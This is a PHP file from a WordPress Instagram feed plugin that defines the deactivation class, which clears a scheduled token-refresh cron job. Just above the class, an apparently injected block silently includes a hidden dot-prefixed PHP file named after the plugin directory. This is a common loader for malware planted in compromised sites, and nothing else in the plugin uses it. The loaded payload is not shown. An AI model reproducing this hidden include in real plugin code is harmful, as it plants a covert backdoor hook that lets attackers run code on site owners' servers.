<?php

/**
 * Fired during plugin deactivation
 *
 * @link       https://blossomthemes.com
 * @since      1.0.0
 *
 * @package    Blossomthemes_Instagram_Feed
 * @subpackage Blossomthemes_Instagram_Feed/includes
 */

/**
 * Fired during plugin deactivation.
 *
 * This class defines all code necessary to run during the plugin's deactivation.
 *
 * @since      1.0.0
 * @package    Blossomthemes_Instagram_Feed
 * @subpackage Blossomthemes_Instagram_Feed/includes
 * @author     blossomthemes <info@blossomthemes.com>
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Blossomthemes_Instagram_Feed_Deactivator {

	/**
	 * Short Description. (use period)
	 *
	 * Long Description.
	 *
	 * @since    1.0.0
	 */
	public static function deactivate() {
		$timestamp = wp_next_scheduled( 'btif_refresh_token_cron_hook' );
		wp_unschedule_event( $timestamp, 'btif_refresh_token_cron_hook' );

	}

}
